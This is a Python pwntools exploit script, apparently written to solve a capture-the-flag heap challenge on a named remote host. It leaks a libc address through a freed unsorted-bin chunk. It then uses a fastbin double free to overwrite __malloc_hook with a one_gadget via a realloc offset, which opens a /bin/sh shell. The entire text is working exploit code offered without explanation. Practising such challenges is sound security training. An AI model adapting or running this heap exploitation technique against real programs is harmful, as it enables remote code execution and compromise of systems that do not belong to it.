from pwn import *
import time

context.log_level = 'debug'

debug = True

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
if debug:
    io = process("./vuln")
else:
    io = remote("week-1.hgame.lwsec.cn", 32461)


def ddebug():
    gdb.attach(io)
    pause()


rop = ROP('./vuln')
roplibc = ROP('./libc.so.6')


def add(idx, size, content):
    io.sendlineafter(">", "1")
    io.sendlineafter("Index: ", str(idx))
    io.sendlineafter("Size: ", str(size))
    io.sendlineafter("Content: ", content)


def delete(idx):
    io.sendlineafter(">", "2")
    io.sendlineafter("Index: ", str(idx))


def show(idx):
    io.sendlineafter(">", "3")
    io.sendlineafter("Index: ", str(idx))


add(0, 0xd0, "abc")
add(1, 0x60, "abc")
add(2, 0x60, "abc")
add(3, 0x60, "abc")

delete(0)
show(0)

libcmain_offset = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
success("main_arena -> " + hex(libcmain_offset))

main_arena_offset = 0x3c4b78 # 题目中libc
libc.address = libcmain_offset - main_arena_offset
success("libc address -> " + hex(libc.address))
_malloc_hook_address = libc.symbols["__malloc_hook"]
success("malloc_hook -> " + hex(_malloc_hook_address))
_free_hook_address = libc.symbols["__free_hook"]
success("free_hook -> " + hex(_free_hook_address))
realloc_address = libc.sym['realloc']
success("realloc_address -> " + hex(realloc_address))
success("system -> " + hex(libc.symbols["system"]))
delete(1)
delete(2)
delete(1)
delete(3)
show(3)
heap = u64(io.recvline().ljust(8, b"\x00"))
success("heap -> " + hex(heap))

#ddebug()
add(4, 0x60, p64(0))
add(5, 0x60, p64(_malloc_hook_address - 0x23))
add(6, 0x60, "/bin/sh\0")
add(7, 0x60, p64(0))
"""
0x45226 execve("/bin/sh", rsp+0x30, environ)
0x4527a execve("/bin/sh", rsp+0x30, environ)
0xf03a4 execve("/bin/sh", rsp+0x50, environ)
0xf1247 execve("/bin/sh", rsp+0x70, environ)  [rsp+0x70] == NULL
"""
onegadget = libc.address + 0xf1247
success("onegadget -> " + hex(onegadget))
add(8, 0x60, b"a" * (0x13 - 8) + p64(onegadget) + p64(realloc_address + 11))
io.sendlineafter(b">", b"1")
io.sendlineafter(b"Index: ", b'9')
io.sendlineafter(b"Size: ", str(0x60).encode())
io.interactive()
